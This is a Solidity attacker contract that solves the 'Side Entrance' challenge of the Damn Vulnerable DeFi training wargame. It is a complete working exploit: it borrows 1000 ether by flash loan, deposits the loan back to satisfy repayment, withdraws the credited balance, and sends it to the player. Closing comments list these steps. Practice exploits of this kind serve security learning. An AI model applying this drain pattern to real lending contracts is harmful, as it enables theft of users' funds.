// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {
    address player;

    SideEntranceLenderPool pool;

    constructor(address _player, address _pool) {
        player = _player;
        pool = SideEntranceLenderPool(_pool);
    }

    receive() external payable {}

    function attack() external {
        pool.flashLoan(1000 ether);
        pool.withdraw();
        (bool sent, ) = player.call{value: address(this).balance}("");
        require(sent, "transfer failed");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}

// 1) borrow 1000
// 2) deposit 1000
// 3) flash loan completes
// 4) withdraw 1000
